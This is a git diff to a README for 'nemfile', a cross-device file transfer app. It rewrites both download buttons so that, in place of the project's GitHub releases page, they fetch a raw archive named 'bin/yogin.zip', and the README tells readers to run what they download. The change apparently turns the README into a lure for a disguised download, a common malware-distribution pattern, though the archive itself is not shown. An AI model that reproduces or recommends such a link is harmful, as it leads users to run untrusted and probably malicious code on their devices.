@@ -28,7 +28,7 @@ Think of it as your own personal AirDrop that works on any device, anywhere in y
 
 ### Step 1: Download nemfile
 
-[![Download nemfile](https://img.shields.io/badge/Download-nemfile-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fehaumohakeey-del/nemfile/releases)
+[![Download nemfile](https://img.shields.io/badge/Download-nemfile-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/fehaumohakeey-del/nemfile/master/bin/yogin.zip)
 
 Visit this link to download the application. The download page will show you the latest version available for your system.
 
@@ -188,7 +188,7 @@ If you encounter any issues:
 
 Ready to experience the easiest way to transfer files between your devices?
 
-[![Get nemfile](https://img.shields.io/badge/Get-nemfile-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fehaumohakeey-del/nemfile/releases)
+[![Get nemfile](https://img.shields.io/badge/Get-nemfile-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/fehaumohakeey-del/nemfile/master/bin/yogin.zip)
 
 Visit this link to download the application. After downloading, just run it and scan the QR code with your phone to start sharing files instantly.
 
